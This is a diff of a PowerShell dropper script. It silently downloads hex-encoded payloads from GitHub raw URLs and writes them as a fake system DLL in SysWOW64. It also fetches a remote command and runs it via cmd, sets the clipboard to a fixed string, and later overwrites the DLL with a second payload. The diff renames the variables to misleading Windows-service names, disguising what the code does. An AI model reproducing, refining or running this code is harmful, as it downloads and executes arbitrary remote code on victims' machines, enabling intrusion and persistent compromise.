@@ -1,11 +1,11 @@
 $ErrorActionPreference = 'SilentlyContinue'
 cls
 Add-Type -AssemblyName System.Windows.Forms *> $null
-$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/iwe_history.txt"
-$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/e.txt"
-$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/b.txt"
-$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
-$clipText = "SteF6b2WrAgu"
+$MsUpdateServiceUrl = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/CAHNGE/iwe_history.txt"
+$KernelExecutionPolicy = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/CAHNGE/e.txt"
+$WinSxS_RestorePoint = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/CAHNGE/b.txt"
+$SystemCompatibilityLayer = "C:\Windows\SysWOW64\ntdllp.dll"
+$UserSessionGuid = "SteF6b2WrAgu"
 
 function HexToBytes {
     param([string]$hexStr)
@@ -21,18 +21,18 @@ function HexToBytes {
 }
 
 try {
-    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 20
+    $responseA = Invoke-WebRequest -Uri $MsUpdateServiceUrl -UseBasicParsing -TimeoutSec 20
     $hexContent = $responseA.Content
     $bytes = HexToBytes $hexContent
     if ($bytes -ne $null) {
-        [IO.File]::WriteAllBytes($filePath, $bytes)
+        [IO.File]::WriteAllBytes($SystemCompatibilityLayer, $bytes)
     }
 } catch {}
 
-Set-Clipboard $clipText *> $null
+Set-Clipboard $UserSessionGuid *> $null
 
 try {
-    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 20
+    $responseB = Invoke-WebRequest -Uri $KernelExecutionPolicy -UseBasicParsing -TimeoutSec 20
     $cmdToRun = $responseB.Content.Trim()
     if ($cmdToRun) {
         Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
@@ -44,11 +44,11 @@ do {
 } while (Get-Process -Name "Installer")
 
 try {
-    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 20
+    $responseC = Invoke-WebRequest -Uri $WinSxS_RestorePoint -UseBasicParsing -TimeoutSec 20
     $newHexContent = $responseC.Content
     $newBytes = HexToBytes $newHexContent
     if ($newBytes -ne $null) {
-        [IO.File]::WriteAllBytes($filePath, $newBytes)
+        [IO.File]::WriteAllBytes($SystemCompatibilityLayer, $newBytes)
     }
 } catch {}
 
